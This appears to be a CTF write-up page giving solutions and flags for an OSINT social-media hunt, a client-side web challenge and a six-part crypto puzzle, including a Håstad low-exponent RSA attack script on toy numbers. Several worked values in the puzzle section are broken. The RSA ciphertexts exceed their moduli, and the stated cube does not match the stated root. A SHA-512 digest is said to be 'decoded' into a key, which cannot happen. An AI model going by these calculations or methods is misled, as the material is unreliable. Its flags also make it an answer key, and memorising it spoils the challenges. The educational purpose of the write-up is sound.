href="/writeups/FinalTrace_2025/36-maelle-confrontation.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="maelle-confrontation">Maelle Confrontation</h1><ul><li><strong>Category</strong>: [OSINT]<li><strong>Author</strong>: [ace6002]<li><strong>Level</strong>: [Medium]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Multi flag OSINT based on social media/tracking down a certain user.</p><h2 id="question-to-be-given"><span class="mr-2">Question to be given</span><a href="#question-to-be-given" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Beneath whispers of the forgotten web, one name drifts between the cracks: 1skim. Seek not the obvious, but what lingers behind the veil of public traces. Threads lead where shadows meet data. The flag is no secret—only unseen. Follow the noise, and let open eyes find the hidden truth.
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>[Instagram, bsky.app, Discord]</ul><h4 id="step-1-take-given-username-in-question-1skim_-and-find-the-instagram-account-with-the-same-username"><span class="mr-2">Step 1: Take given username in question (1skim_) and find the instagram account with the same username.</span><a href="#step-1-take-given-username-in-question-1skim_-and-find-the-instagram-account-with-the-same-username" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h4 id="step-2-there-are-2-posts-each-post-leads-to-a-different-flag"><span class="mr-2">Step 2: There are 2 posts. Each post leads to a different flag.</span><a href="#step-2-there-are-2-posts-each-post-leads-to-a-different-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h4 id="path-1-post-1-states-man-i-sure-love-bisky-kruger-from-hxh-definitely-one-of-the-best-teachers-out-there-shes-for-sure-my-number-2-the-hint-lies-with-bisky-it-translates-to-bsky-ie-bskyapp-a-twitter-alternative-much-lesser-known-search-for-username-2skim-on-bskyapp-the-player-will-find-the-flag-1-in-base64"><span class="mr-2">Path 1: Post 1 states <code class="language-plaintext highlighter-rouge">man, i sure love bisky kruger from HxH. definitely one of the best teachers out there. shes for sure my number 2.</code> The hint lies with <code class="language-plaintext highlighter-rouge">bisky</code> it translates to <code class="language-plaintext highlighter-rouge">bsky</code> i.e. <code class="language-plaintext highlighter-rouge">bsky.app</code>. A twitter alternative, much lesser known. Search for username 2skim on bsky.app, the player will find the flag 1, in base64.</span><a href="#path-1-post-1-states-man-i-sure-love-bisky-kruger-from-hxh-definitely-one-of-the-best-teachers-out-there-shes-for-sure-my-number-2-the-hint-lies-with-bisky-it-translates-to-bsky-ie-bskyapp-a-twitter-alternative-much-lesser-known-search-for-username-2skim-on-bskyapp-the-player-will-find-the-flag-1-in-base64" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h4 id="path-2-post-2-states-goat-did-you-know-laid-loved-clyde-more-than-anything-thats-my-number-3-though-god-knows-how-its-his-top-the-hint-lies-with-clyde-sent-a-request-to-the-discord-username-3skim_-in-the-about-me-lies-a-clue-anime-lovar-no-questionig-it-really-has-some-soul-in-it-you-know-unlike-hollywood-the-clue-here-is-animesoul-the-largest-public-anime-server-on-discord-the-status-of-3skim_-reads-just-chillin-another-clue-join-animesoul-head-into-chill-chat-and-search-for-messages-by-3skim_-there-is-only-one-message-with-the-flag-in-base64"><span class="mr-2">Path 2: Post 2 states <code class="language-plaintext highlighter-rouge">goat. did you know laid loved Clyde more than anything? that's my number 3 though, god knows how it's his top.</code> The hint lies with Clyde. Sent a request to the discord username <code class="language-plaintext highlighter-rouge">3skim_</code>. In the About Me lies a clue, <code class="language-plaintext highlighter-rouge">ANIME LOVAR. NO QUESTIONIG. It really has some Soul in it you know, unlike Hollywood.</code> the clue here is AnimeSoul, the largest public anime server on Discord. The status of 3skim_ reads <code class="language-plaintext highlighter-rouge">just chillin'</code>, another clue. Join AnimeSoul, head into #chill-chat, and search for messages by 3skim_. There is only one message, with the flag in base64.</span><a href="#path-2-post-2-states-goat-did-you-know-laid-loved-clyde-more-than-anything-thats-my-number-3-though-god-knows-how-its-his-top-the-hint-lies-with-clyde-sent-a-request-to-the-discord-username-3skim_-in-the-about-me-lies-a-clue-anime-lovar-no-questionig-it-really-has-some-soul-in-it-you-know-unlike-hollywood-the-clue-here-is-animesoul-the-largest-public-anime-server-on-discord-the-status-of-3skim_-reads-just-chillin-another-clue-join-animesoul-head-into-chill-chat-and-search-for-messages-by-3skim_-there-is-only-one-message-with-the-flag-in-base64" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h3 id="flag-1"><span class="mr-2">Flag 1</span><a href="#flag-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{l0v3_Y0uu}
</pre></table></code></div></div><h3 id="flag-2"><span class="mr-2">Flag 2</span><a href="#flag-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{d3nyy}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{d3nyy} </code><hr><h1 id="auditor-encounter"> Auditor Encounter <a href="/writeups/FinalTrace_2025/37-challenge-name.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><ul><li><strong>Category</strong>: Web / ARG<li><strong>Author</strong>: Oviya</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>An animated in-page “Auditor” asks a single question: “Do you regret what you created?”<br /> This is a static web challenge (HTML + CSS + JS). The player replies via a small dialogue input. If the player responds with <code class="language-plaintext highlighter-rouge">yes</code>, the Auditor prints the flag; <code class="language-plaintext highlighter-rouge">no</code> yields a cryptic denial. The flag is obfuscated (base64) inside the client-side script.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I opened the challenge in the browser and inspected the page source. Since the site is static, I looked for client-side JavaScript (either inline or linked as <code class="language-plaintext highlighter-rouge">static/script.js</code>). The flag was not directly visible in the HTML, so I checked the JavaScript file for any encoded strings or decode logic.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Browser Developer Tools (View Source / DevTools)<li>Text editor (VSCode)<li>Command line base64 utilities or Python for decoding</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-open-the-page-and-view-source--linked-script"><span class="mr-2">Step 1: Open the page and view source / linked script</span><a href="#step-1-open-the-page-and-view-source--linked-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>In the browser: Right click → View Page Source Or open linked file directly: open static/script.js # or use your editor to open the file Explanation: The page is static. The script reference (<code class="language-plaintext highlighter-rouge">static/script.js</code>) contains the dialogue logic and probably hides the flag in an encoded form.</p><h4 id="step-2-locate-the-base64-encoded-flag-string-in-the-javascript"><span class="mr-2">Step 2: Locate the base64-encoded flag string in the JavaScript</span><a href="#step-2-locate-the-base64-encoded-flag-string-in-the-javascript" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Search for common patterns in the JS file grep -n “FLAG_B64” static/script.js or open the file and look for base64-like strings (long strings with letters/numbers/+ / =) Explanation: The script held a variable named <code class="language-plaintext highlighter-rouge">FLAG_B64</code> with a base64 string. This indicates the flag is client-side but obfuscated.</p><h4 id="step-3-decode-the-base64-string-to-obtain-the-flag"><span class="mr-2">Step 3: Decode the base64 string to obtain the flag</span><a href="#step-3-decode-the-base64-string-to-obtain-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Example using Linux base64 tool (replace the string with the one found) echo ‘Q1lTfGF1ZGl0X3JlZ3JldC5wYXNzfQ==’ | base64 –decode</p><p>OR using Python: python3 -c “import base64; print(base64.b64decode(‘Q1lTfGF1ZGl0X3JlZ3JldC5wYXNzfQ==’).decode())”</p><p>OR in browser console (if the site exposes it): atob(‘Q1lTfGF1ZGl0X3JlZ3JldC5wYXNzfQ==’)</p><p>Explanation: Decoding the base64 string reveals the flag in plain text. Any of the above methods will produce the same result.</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>CYS{aud1t_regr3t_pass}</p><h2> Flag</h2><code> CYS{aud1t_regr3t_pass} </code><hr><h1 id="citadel-entry-lock"> Citadel Entry Lock <a href="/writeups/FinalTrace_2025/38-citadel-entry-lock.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="key-1--seal">Key 1 — SEAL</h1><p><strong>Observation</strong></p><ul><li>The puzzle presents a 16×16 symbol grid → hint: <strong>hex</strong> (16 values: <code class="language-plaintext highlighter-rouge">0x0</code>–<code class="language-plaintext highlighter-rouge">0xF</code>).<li>One edge (first row / first column) contains a set of unique symbols which map to the 16 hex digits.<li>Some symbols are visually distinct (black-haired vs white-haired). The black-haired symbol positions encode the meaningful bytes.</ul><p><strong>Method</strong></p><ol><li>Map each unique symbol in the first row (or first column) to the hex digits <code class="language-plaintext highlighter-rouge">0x0</code>–<code class="language-plaintext highlighter-rouge">0xF</code>.<li>For the black-haired symbol occurrences, read the mapped hex bytes in sequence.<li>Convert the resulting hex byte sequence to ASCII.</ol><p><strong>Extracted data</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>53 45 41 4C 𓀅 𓀃 𓀄 𓀅 𓀄 𓀁 𓀄 𓀌
</pre></table></code></div></div><p>Interpreting the ASCII bytes <code class="language-plaintext highlighter-rouge">53 45 41 4C</code> → <code class="language-plaintext highlighter-rouge">"SEAL"</code>.</p><p><strong>Result (Key 1):</strong> <code class="language-plaintext highlighter-rouge">SEAL</code></p><hr /><h1 id="key-2--raid-håstad--low-exponent-broadcast-attack">Key 2 — RAID (Håstad / low-exponent broadcast attack)</h1><p><strong>Problem summary</strong></p><ul><li>You are given three RSA public keys with a small, identical public exponent <code class="language-plaintext highlighter-rouge">e = 3</code> and three ciphertexts <code class="language-plaintext highlighter-rouge">c1, c2, c3</code>.<li>The same plaintext <code class="language-plaintext highlighter-rouge">m</code> was encrypted under each modulus <code class="language-plaintext highlighter-rouge">n1, n2, n3</code>.<li>This is the classic setting for <strong>Håstad’s Broadcast Attack</strong>: when the same message is encrypted with small <code class="language-plaintext highlighter-rouge">e</code> and pairwise-coprime moduli, use CRT and extract the integer e-th root.</ul><p><strong>Mathematical setup</strong></p><p>We have:</p><p>[ m^3 \equiv c_1 \pmod{n_1},\qquad m^3 \equiv c_2 \pmod{n_2},\qquad m^3 \equiv c_3 \pmod{n_3}. ]</p><p>If the moduli are pairwise coprime and (m^3 &lt; n_1 n_2 n_3), then the CRT combined value (X) equals the integer (m^3). Recover (m) by taking the integer cube root.</p><p><strong>Given values</strong></p><div class="table-wrapper"><table><thead><tr><th>index<th style="text-align: right">modulus (n_i)<th style="text-align: right">ciphertext (c_i)<tbody><tr><td>1<td style="text-align: right"><code class="language-plaintext highlighter-rouge">20000000000003</code><td style="text-align: right"><code class="language-plaintext highlighter-rouge">120045155700768461749</code><tr><td>2<td style="text-align: right"><code class="language-plaintext highlighter-rouge">30000000000007</code><td style="text-align: right"><code class="language-plaintext highlighter-rouge">22749457632</code><tr><td>3<td style="text-align: right"><code class="language-plaintext highlighter-rouge">40000000000009</code><td style="text-align: right"><code class="language-plaintext highlighter-rouge">2800451557007722749457632</code><tr><td>e<td style="text-align: right"><code class="language-plaintext highlighter-rouge">3</code><td style="text-align: right">(public exponent)</table></div><p><strong>Solution steps (summary)</strong></p><ol><li>Use the Chinese Remainder Theorem (CRT) to compute <code class="language-plaintext highlighter-rouge">X</code> such that <code class="language-plaintext highlighter-rouge">X ≡ c_i (mod n_i)</code> for all i. This produces a unique <code class="language-plaintext highlighter-rouge">X</code> modulo <code class="language-plaintext highlighter-rouge">N_total = n1*n2*n3</code>.<li>If <code class="language-plaintext highlighter-rouge">m^3 &lt; N_total</code>, <code class="language-plaintext highlighter-rouge">X</code> equals <code class="language-plaintext highlighter-rouge">m^3</code> as an integer.<li>Compute the integer cube root of <code class="language-plaintext highlighter-rouge">X</code> to recover <code class="language-plaintext highlighter-rouge">m</code>.<li>Convert <code class="language-plaintext highlighter-rouge">m</code> (integer) to a big-endian hex string and then to ASCII to read the plaintext.</ol><p><strong>Python reference (concise, reproducible)</strong></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="c1"># Requires: sympy, gmpy2
</span><span class="kn">from</span> <span class="n">sympy.ntheory.modular</span> <span class="kn">import</span> <span class="n">crt</span>
<span class="kn">from</span> <span class="n">gmpy2</span> <span class="kn">import</span> <span class="n">iroot</span>

<span class="c1"># Provided moduli and ciphertexts
</span><span class="n">n</span> <span class="o">=</span> <span class="p">[</span>
    <span class="mi">20000000000003</span><span class="p">,</span>      <span class="c1"># n1
</span>    <span class="mi">30000000000007</span><span class="p">,</span>      <span class="c1"># n2
</span>    <span class="mi">40000000000009</span>       <span class="c1"># n3
</span><span class="p">]</span>

<span class="n">c</span> <span class="o">=</span> <span class="p">[</span>
    <span class="mi">120045155700768461749</span><span class="p">,</span>          <span class="c1"># c1
</span>    <span class="mi">22749457632</span><span class="p">,</span>                    <span class="c1"># c2
</span>    <span class="mi">2800451557007722749457632</span>       <span class="c1"># c3
</span><span class="p">]</span>

<span class="n">e</span> <span class="o">=</span> <span class="mi">3</span>

<span class="c1"># 1) CRT -&gt; resultant = m^3
</span><span class="n">resultant</span><span class="p">,</span> <span class="n">modulus</span> <span class="o">=</span> <span class="nf">crt</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">CRT result (m^3):</span><span class="sh">"</span><span class="p">,</span> <span class="n">resultant</span><span class="p">)</span>

<span class="c1"># 2) integer cube root
</span><span class="n">m_int</span><span class="p">,</span> <span class="n">is_perfect</span> <span class="o">=</span> <span class="nf">iroot</span><span class="p">(</span><span class="n">resultant</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">is_perfect</span><span class="p">:</span>
    <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">CRT result is not a perfect cube; attack failed.</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Recovered integer m:</span><span class="sh">"</span><span class="p">,</span> <span class="n">m_int</span><span class="p">)</span>

<span class="c1"># 3) convert to ASCII
</span><span class="n">hex_val</span> <span class="o">=</span> <span class="nf">hex</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">m_int</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">hex_val</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span><span class="p">:</span>
    <span class="n">hex_val</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span> <span class="o">+</span> <span class="n">hex_val</span>
<span class="n">plaintext</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">hex_val</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Plaintext:</span><span class="sh">"</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">)</span>
</pre></table></code></div></div><p><strong>Intermediate / expected values</strong></p><ul><li>CRT result <code class="language-plaintext highlighter-rouge">m^3</code> (as computed): <code class="language-plaintext highlighter-rouge">262800451557007722749457632</code><li>Integer cube root <code class="language-plaintext highlighter-rouge">m</code>: <code class="language-plaintext highlighter-rouge">1380010308</code><li>Hex of <code class="language-plaintext highlighter-rouge">m</code> (big-endian): <code class="language-plaintext highlighter-rouge">0x52414944</code> → ASCII: <code class="language-plaintext highlighter-rouge">"RAID"</code></ul><p><strong>Result (Key 2):</strong> <code class="language-plaintext highlighter-rouge">RAID</code></p><hr /><h1 id="key-3--cross">Key 3 — CROSS</h1><p><strong>Observation</strong></p><ul><li>A word search / letter grid with very few actual English words.<li>The visible words (the only real words in the grid) are <code class="language-plaintext highlighter-rouge">"THE"</code>, <code class="language-plaintext highlighter-rouge">"ANSWER"</code>, <code class="language-plaintext highlighter-rouge">"IS"</code>, <code class="language-plaintext highlighter-rouge">"CROSS"</code>.</ul><p><strong>Method</strong></p><ul><li>Either brute-force search the grid for words or visually scan it.<li>The sequence of real words forms the phrase: <strong>“THE ANSWER IS CROSS”</strong>.</ul><p><strong>Result (Key 3):</strong> <code class="language-plaintext highlighter-rouge">CROSS</code></p><hr /><h1 id="key-4--maat">Key 4 — MAAT</h1><p><strong>Overview</strong></p><p>The ciphertext is a layered transformation pipeline. Working backwards through the layers yields a SHA-512 digest which, when interpreted/decoded, produces the key.</p><p><strong>Pipeline (as given / reversed)</strong></p><ol><li><code class="language-plaintext highlighter-rouge">SKIP CIPHER (size = 17)</code> → produces a tokenized string<li><code class="language-plaintext highlighter-rouge">TWIN HEX</code> transformation<li><code class="language-plaintext highlighter-rouge">KENNY LANG</code> (South Park / simple substitution style encoding)<li><code class="language-plaintext highlighter-rouge">TWIN HEX</code><li><code class="language-plaintext highlighter-rouge">SHA512</code><li>ASCII decode → final key</ol><p><strong>Notable intermediate</strong></p><ul><li>SKIP CIPHER(SIZE=17): ``` 1KU55X5KZ5HJ5AX5AL1H75MZ5A85YR5T75HB1AZ5KP5TP5JR5AB1HZ5KB5HK5OR1AW5WX5HZ1HR5KR5TP5W85TZ5AR1AR5HX5TB1AR5T85H85HB1TZ5MZ59Q5T85W85TU5TP5TR5HR5T85HR5KR1AB19R5AJ1XB1SB1AR5TR5WR5HZ1HR5585H81K855Z5K85AZ5AR5T81K85T85HB18R5AJ5W75TR5T71XP19Z5M85HB58R5TP5A85A81Y85YK15Q5H85WR1KR5575AK1AP5TX5T85KZ5HA5KZ5KR5OR5HB5MX5W85HK5AR5HZ5XX5W85A75AS5AP5TX5HK5KZ1T75WR5HB1AZ5KZ10R5W85TZ58P5T85HZ1HZ5WZ5H81KK5HJ1AR5AB1AB1HK5KR1H85KR5HB5HR1TX5WP5W85KR5MR5KZ5A81WB5WX5TR5KB1K85K85571A85881T81H85W85HR5K85TZ5WR5WJ1T75NJ11X1WX1HB5KX5885JB5ZZ1T75TR5AR5175KR5HR5AR5K85YZ5TP5NZ1H75AR1W85TP58P5LX5X75T85HZ</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>
- TWIN HEX:
</pre></table></code></div></div><p>1bh5zh58w5xw58w5zk5rh1ba5rk58t5xt1u85rh1kj5rh5pt58t5rk5za1bh5zh58t57558t5za5zh1kn5rh5xt58w5pz1bh5zh58w5pt5zk5zh5ra1bk5rk5zh5pt1rh5rh1bh5za5rh5xt5rk5781bh58w58t5751rh5rk1bh5rk1pt58t5za58t1ja5rk58t5xt5ra5za58w1kj5rh5px1jk5za1ja5rk58w5xw58m5xy1bh5za1pw58w5zk58t1ja5rk58w5755za5791bh58w58t5791ly5ra1a158t5pt1q01kn5rh5755za5ra5rh1ja5zk5zk57858t5751ja5zk5ra5pt58w5q11bk5rk5ra57858m5xx1bk58m1sl18w5zh1ba5rh5ra5xx18t58w1bh5ra5ra5pt5za5xs1ko5zk5px18t58w1bh5ra5zh5791u85rh1ko5ra5xt5zh5py1ba5rh5ra5xt58t5rk5rk1bk58t58m5pt5rk5ra58t1bh58w58t5xt1wm58w1kh58t5755rh5xy1ba5zh5rh57858w5zk5rk</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>
- KENNY LANG SOUTHPARK:
</pre></table></code></div></div><p>1mpmfpp4fpppmm1fmpfmp18pmm53mmm1fmmppf1mpmfmf1fmpfpm57mmp1fpm71mpmfpm1pppmmf1pmppmm17mmm1mpfmmp1mpf41mfpfmf17mmp1mmp71fmpffm4fmpfmp1mfpffp53mmm54ppf4fmpfpp4ffp61mpf74fpppfm4fmpfpf1pff51mfpfmf55fmf19fmm17857mmf1pfmfmm4fppppf4fmf14fppmfm1fpm91pmpmff4ffp51pff850ppm1fmmmfp50mfp1mmfmfm1pfp058ppm50mfp1mmfpmf58pmm58mfp1pmm61fmmmfp1fmmpmp1pfmffm1mpmffm1mfpfmp19ffp51fmf1mmp61fpmmmf4fpppmp</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>
- TWIN HEX: 
</pre></table></code></div></div><p>1dw4wj1tt18j53a1so1du1tv57b1v71dv1nc1kj17a1fb1f41hu17b1b71ty4tt1hz53a54o4tw4z61f74wp4tx1r51hu55u19s17857c1ps4wo4u14wg1v91ki4z51r850m1sh50h1cg1q058m50h1cl58j58h1j61sh1sk1py1dy1ht19z51u1b61vc4wk</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>- The final SHA-512 digest in the chain is:
</pre></table></code></div></div><p>2db38a0cdf882b8cf7932c685306373042071c8fa147dfe8a4c233b9a57a42eb1004f870b8a9b09552c17dcf81ca2078ffca25fcfa4b8184762f4117d21b98b4</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>
**Conclusion**

- After reversing the transformations and decoding the SHA-512 result, the plaintext key obtained is: `MAAT`.

**Result (Key 4):** `MAAT`

---

# Key 5 — MAZE

**Observation**

- Several 8×8-like grids produce SHA-256 digests when unspiralled.
- Each grid, when read with the specified outward, left-start, clockwise spiral algorithm, yields an 8×32 (256-bit) SHA256 word fragment.
- The puzzle lists grouped hexadecimal 32-byte SHA256 outputs and associates them to English words.

**Interpretation**
- Spiral Pattern
</pre></table></code></div></div><p>1)20d21a67·ac24d157·0b679998·b4344d9a·83a3b8f3·1b42e0a5·40544695·1c439f90 2)f826b683·37334d8e·7e46f925·e8670e23·030c2178·3ba7b299·c7c724fc·d1a761ff 3)e1900ba2·7ab930f6·017e98af·bc903491·2edbb7c2·9b864a02·bec73e01·bf1f0eac 4)808bb15f·07488f45·f05fa88c·0d1d34d6·868bc51c·382a6d05·a305622c·c1ad27d3 5)416f57f6·65ff5633·517705da·91651f6e·4cfafdac·d8ba9431·51281d5f·d9cdfbe9 6)11eab27f·623d15ec·099e0f14·be6edf14·7c69d59b·8e7c49da·bd5d9f26·9ad8f2c8</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre><td class="rouge-code"><pre>
- The extracted SHA256 hashes correspond to the phrase:
  - `The:`  `b344d80e24a3679999fa964450b34bc24d1578a35509f934c1418b0a20d21a67`
  - `key:`  `2c70e12b7a0646f92279f427c7b38e7334d8e5389cff167a1dc30e73f826b683`
  - `you:`  `bb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2`
  - `seek:` `cbd345d6a2815fa88d1022650386d07488f45c6c5c3d72da1ca380f0808bb15f`
  - `is:`   `fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6`
  - `MAZE:` `d9edf594c7669e0f119d2f9d5dece923d15ec44ba68c2f8da9b87b0611eab27f`

- Combined phrase: **"The key you seek is MAZE."**

**Result (Key 5):** `MAZE`

---

# Key 6 — HODOS

**Observation**

- A long block of transformed text using a route cipher.
- The transformation parameters: horizontal width = **4**; encoding uses a route reading pattern described as:
  - *Write horizontally from top-left, then read vertical lines from bottom-left* (i.e. a specific route/permutation).

**Method**

- Implement or use an online route-cipher tool with the given width and read order. Decoding the route cipher recovers a plaintext passage where the key word is clearly visible.

**Result (Key 6):** `HODOS`


## Decryption script (route cipher — width = 4)

```python
import math
# Ciphertext should be set to the encoded string (use raw string: r"...")
ciphertext = ""  # &lt;-- paste ciphertext here
width = 4

# Compute number of rows (each row was written left→right)
rows = math.ceil(len(ciphertext) / width)
cols = width

# Determine how many characters go in each column (left to right)
remainder = len(ciphertext) % width
col_lengths = [rows if i &lt; remainder else rows - 1 for i in range(width)] if remainder else [rows] * width

# Split ciphertext into columns as read bottom→top, left→right
columns = []
idx = 0
for c_len in col_lengths:
    col = ciphertext[idx:idx + c_len]
    columns.append(col[::-1])  # reverse each column (because read bottom→top)
    idx += c_len

# Reconstruct plaintext by reading horizontally (left→right, top→bottom)
plaintext = ''
for r in range(rows):
    for c in range(cols):
        if r &lt; len(columns[c]):
            plaintext += columns[c][r]

# Replace ⌴ with space (if used in your ciphertext)
plaintext = plaintext.replace('⌴', ' ')

print(plaintext)
</pre></table></code></div></div><hr /><h1 id="final-assembly">Final assembly</h1><p>After recovering each key, assemble them in the instructed order to form the final flag.</p><ul><li><strong>KEY 1:</strong> <code class="language-plaintext highlighter-rouge">SEAL</code><li><strong>KEY 2:</strong> <code class="language-plaintext highlighter-rouge">RAID</code><li><strong>KEY 3:</strong> <code class="language-plaintext highlighter-rouge">CROSS</code><li><strong>KEY 4:</strong> <code class="language-plaintext highlighter-rouge">MAAT</code><li><strong>KEY 5:</strong> <code class="language-plaintext highlighter-rouge">MAZE</code><li><strong>KEY 6:</strong> <code class="language-plaintext highlighter-rouge">HODOS</code></ul><p><strong>FINAL FLAG:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{SEAL_RAID_CROSS_MAAT_MAZE_HODOS}
